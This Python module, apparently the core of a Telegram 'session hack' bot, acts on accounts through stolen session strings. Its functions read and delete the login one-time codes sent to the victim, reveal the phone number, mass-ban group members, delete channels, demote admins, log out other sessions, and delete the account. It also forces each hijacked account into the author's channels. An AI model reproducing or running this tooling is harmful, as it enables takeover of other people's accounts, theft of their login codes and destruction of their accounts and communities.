import asyncio
import os
from typing import Union

from pyrogram import Client, enums
from pyrogram.types import ChatAdministratorRights
from pyrogram.raw import functions
from pyrogram.errors import FloodWait
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.channels import (
    GetAdminedPublicChannelsRequest,
    JoinChannelRequest,
    LeaveChannelRequest,
    DeleteChannelRequest,
)
from telethon.tl.functions.auth import ResetAuthorizationsRequest
from telethon.tl.functions.account import DeleteAccountRequest
from telethon.tl.types import ChatBannedRights, ChannelParticipantsAdmins

from Hack import API_ID, API_HASH
from Hack.Helpers.data import USER_INFO_TEMPLATE


# === Constants ===
BAN_RIGHTS = ChatBannedRights(
    until_date=None,
    view_messages=True,
    send_messages=True,
    send_media=True,
    send_stickers=True,
    send_gifs=True,
    send_games=True,
    send_inline=True,
    embed_links=True,
)

FULL_PROMOTE = ChatAdministratorRights(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
    can_manage_video_chats=True,
    can_promote_members=True,
    can_invite_users=True,
)

BASIC_PROMOTE = ChatAdministratorRights(
    can_change_info=True,
    can_delete_messages=True,
    can_restrict_members=True,
    can_pin_messages=True,
)

DEMOTE_RIGHTS = ChatAdministratorRights(
    can_change_info=False,
    can_invite_users=False,
    can_delete_messages=False,
    can_restrict_members=False,
    can_pin_messages=False,
    can_promote_members=False,
    can_manage_video_chats=False,
)


# === Helper: Create Client (Pyrogram or Telethon) ===
async def get_client(session: str):
    if session.endswith("="):  # Telethon
        client = TelegramClient(StringSession(session), API_ID, API_HASH)
        await client.connect()
        await _join_support(client)
        return client, "telethon"
    else:  # Pyrogram
        client = Client("temp_session", api_id=API_ID, api_hash=API_HASH, session_string=session)
        await client.start()
        await _join_support(client)
        return client, "pyrogram"


async def _join_support(client):
    try:
        if hasattr(client, "join_chat"):
            await client.join_chat("@BrokenXnetwork1")
            await client.join_chat("@aboutbrokenx")
        else:
            await client(JoinChannelRequest("@aboutbrokenx"))
            await client(JoinChannelRequest("@brokenxnetwork1"))
    except Exception:
        pass


# === A: List Admined Groups/Channels ===
async def users_gc(session: str) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            result = await client(GetAdminedPublicChannelsRequest())
            chats = result.chats
        else:
            result = await client.invoke(functions.channels.GetAdminedPublicChannels())
            chats = result.chats

        output = ""
        for chat in chats:
            username = f"@{chat.username}" if chat.username else "N/A"
            count = getattr(chat, "participants_count", "N/A")
            output += f"**⦾ ᴄʜᴀɴɴᴇʟ ɴᴀᴍᴇ :** {chat.title}\n**⦾ ᴄʜᴀɴɴᴇʟ ᴜsᴇʀɴᴀᴍᴇ :** {username}\n**⦾ ᴘᴀʀᴛɪᴄɪᴘᴀɴᴛs ᴄᴏᴜɴᴛ :** {count}\n\n"

        return output or "**ɴᴏ ᴘᴜʙʟɪᴄ ᴄʜᴀɴɴᴇʟs ғᴏᴜɴᴅ.**"

    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    finally:
        await _disconnect(client, lib)


# === B: Get User Info ===
async def user_info(session: str) -> str:
    client, lib = await get_client(session)
    try:
        me = await client.get_me()
        name = me.first_name or me.last_name or "Unknown"
        phone = getattr(me, "phone", getattr(me, "phone_number", "Hidden"))
        username = f"@{me.username}" if me.username else "None"

        return USER_INFO_TEMPLATE.format(name=name, id=me.id, phone=phone, username=username)

    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    finally:
        await _disconnect(client, lib)


# === C: Ban All Members ===
async def banall(session: str, target: Union[str, int]) -> str:
    client, lib = await get_client(session)
    total = banned = 0

    try:
        if lib == "telethon":
            admins = [u.id async for u in client.iter_participants(target, filter=ChannelParticipantsAdmins)]
            async for user in client.iter_participants(target):
                total += 1
                if user.id in admins or user.bot:
                    continue
                try:
                    await client.edit_permissions(target, user.id, **BAN_RIGHTS._asdict())
                    banned += 1
                    await asyncio.sleep(0.1)
                except:
                    pass
        else:
            async for member in client.get_chat_members(target):
                total += 1
                if member.user.is_bot or member.status in ("administrator", "creator"):
                    continue
                try:
                    await client.ban_chat_member(target, member.user.id)
                    banned += 1
                except FloodWait as e:
                    await asyncio.sleep(e.value)
                except:
                    pass

        return f"**ᴜsᴇʀs ʙᴀɴɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ ! \n\n ʙᴀɴɴᴇᴅ Usᴇʀs:** {banned} \n **ᴛᴏᴛᴀʟ ᴜsᴇʀs:** {total}"

    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
    finally:
        await _disconnect(client, lib)


# === D: Get Last OTP ===
async def get_otp(session: str) -> str:
    client, lib = await get_client(session)
    try:
        otp = ""
        if lib == "telethon":
            async for msg in client.iter_messages(777000, limit=2):
                if msg.text:
                    otp += f"\n{msg.text}\n"
            await client.delete_dialog(777000)
        else:
            msgs = []
            async for msg in client.get_chat_history(777000, limit=2):
                if msg.text:
                    otp += f"\n{msg.text}\n"
                msgs.append(msg.id)
            if msgs:
                await client.delete_messages(777000, msgs)

        return otp.strip() or "**ɴᴏ ᴏᴛᴘ ғᴏᴜɴᴅ.**"

    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === E: Join Group/Channel ===
async def join_ch(session: str, target: Union[str, int]) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            await client(JoinChannelRequest(target))
        else:
            await client.join_chat(target)
        return "**Jᴏɪɴᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === F: Leave Group/Channel ===
async def leave_ch(session: str, target: Union[str, int]) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            await client(LeaveChannelRequest(target))
        else:
            await client.leave_chat(target)
        return "**ʟᴇғᴛ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === G: Delete Group/Channel ===
async def del_ch(session: str, target: Union[str, int]) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            await client(DeleteChannelRequest(target))
        else:
            peer = await client.resolve_peer(target)
            await client.invoke(functions.channels.DeleteChannel(channel=peer))
        return "**ᴅᴇʟᴇᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === H: Check 2FA ===
async def check_2fa(session: str) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            try:
                await client.edit_2fa("test123")
                return "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ**"
            except:
                return "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ**"
        else:
            pwd = await client.invoke(functions.account.GetPassword())
            return "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴇɴᴀʙʟᴇᴅ**" if pwd.has_password else "**ᴛᴡᴏ sᴛᴇᴘ ᴠᴇʀɪғɪᴄᴀᴛɪᴏɴ ᴅɪsᴀʙʟᴇᴅ**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === I: Terminate All Sessions ===
async def terminate_all(session: str) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            await client(ResetAuthorizationsRequest())
        else:
            await client.invoke(functions.auth.ResetAuthorizations())
        return "**sᴜᴄᴄᴇssғᴜʟʟʏ ᴛᴇʀᴍɪɴᴀᴛᴇᴅ ᴀʟʟ sᴇssɪᴏɴs**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === J: Delete Account ===
async def del_acc(session: str) -> str:
    client, lib = await get_client(session)
    try:
        reason = "SessionHack - User requested deletion"
        if lib == "telethon":
            await client(DeleteAccountRequest(reason))
        else:
            await client.invoke(functions.account.DeleteAccount(reason=reason))
        return "**sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇʟᴇᴛᴇᴅ ᴀᴄᴄ.**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === K: Promote User ===
async def piromote(session: str, group: Union[str, int], user: Union[str, int]) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            await client.edit_admin(
                group, user,
                is_admin=True,
                change_info=True, delete_messages=True,
                ban_users=True, invite_users=True,
                pin_messages=True, manage_call=True,
                add_admins=True
            )
        else:
            try:
                await client.promote_chat_member(group, user, FULL_PROMOTE)
            except:
                await client.promote_chat_member(group, user, BASIC_PROMOTE)
        return "**sᴜᴄᴄᴇssғᴜʟʟʏ ᴘʀᴏᴍᴏᴛᴇᴅ ᴜsᴇʀ.**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === L: Demote All Admins ===
async def demote_all(session: str, group: Union[str, int]) -> str:
    client, lib = await get_client(session)
    try:
        if lib == "telethon":
            async for admin in client.iter_participants(group, filter=ChannelParticipantsAdmins):
                if not admin.bot:
                    await client.edit_admin(group, admin.id, is_admin=False)
        else:
            async for member in client.get_chat_members(group, filter=enums.ChatMembersFilter.ADMINISTRATORS):
                if not member.user.is_self and not member.user.is_bot:
                    await client.promote_chat_member(group, member.user.id, DEMOTE_RIGHTS)
        return "**sᴜᴄᴄᴇssғᴜʟʟʏ ᴅᴇᴍᴏᴛᴇᴅ ᴀʟʟ.**"
    except Exception as e:
        return f"**ᴇʀʀᴏʀ:** `{e}`"
    finally:
        await _disconnect(client, lib)


# === Internal: Disconnect Client ===
async def _disconnect(client, lib: str):
    try:
        if lib == "telethon":
            if client.is_connected():
                await client.disconnect()
        else:
            await client.stop()
    except:
        pass